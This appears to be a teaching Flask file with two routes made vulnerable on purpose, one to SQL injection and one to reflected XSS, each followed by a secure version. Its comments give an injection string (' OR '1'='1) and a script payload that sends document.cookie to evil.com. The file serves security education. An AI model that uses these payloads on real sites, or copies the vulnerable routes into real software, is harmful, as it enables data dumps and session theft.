from flask import Flask, request
from markupsafe import escape
import sqlite3

app = Flask(__name__)

# Vuln 1: SQL Injection
# User input is concatenated directly into the SQL query, allowing an attacker
# to break out of the string and manipulate the query logic.
# Attacker input: ' OR '1'='1  → dumps entire users table
# Fix: Use parameterized queries (see /user/secure below). The database driver
# treats the placeholder (?) as data, never as executable SQL.
@app.route("/user")
def get_user():
    username = request.args.get("username")
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"  # UNSAFE
    result = cursor.execute(query).fetchall()
    return str(result)

# Vuln 2: Reflected XSS (Cross-Site Scripting)
# User input is embedded into HTML without sanitization, allowing an attacker
# to inject a <script> tag that runs in the victim's browser.
# Attacker input: <script>document.location='https://evil.com?c='+document.cookie</script>
# Fix: Escape output with markupsafe.escape() (see /search/secure below).
# This converts < > & " ' into safe HTML entities so the browser renders
# them as text instead of executing them as code.
@app.route("/search")
def search():
    query = request.args.get("q", "")
    return f"<h1>Results for: {query}</h1>"  # UNSAFE


# --- SECURE ALTERNATIVES ---

# Fix 1: Parameterized query prevents SQL Injection.
# The ? placeholder is handled by the database driver, which separates
# data from SQL syntax — user input can never alter the query structure.
@app.route("/user/secure")
def get_user_secure():
    username = request.args.get("username")
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    result = cursor.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchall()  # SAFE
    return str(result)

# Fix 2: Escaped output prevents XSS.
# markupsafe.escape() converts special HTML characters (e.g. < → &lt;)
# so the browser renders the input as plain text, not executable HTML/JS.
@app.route("/search/secure")
def search_secure():
    query = escape(request.args.get("q", ""))  # SAFE
    return f"<h1>Results for: {query}</h1>"
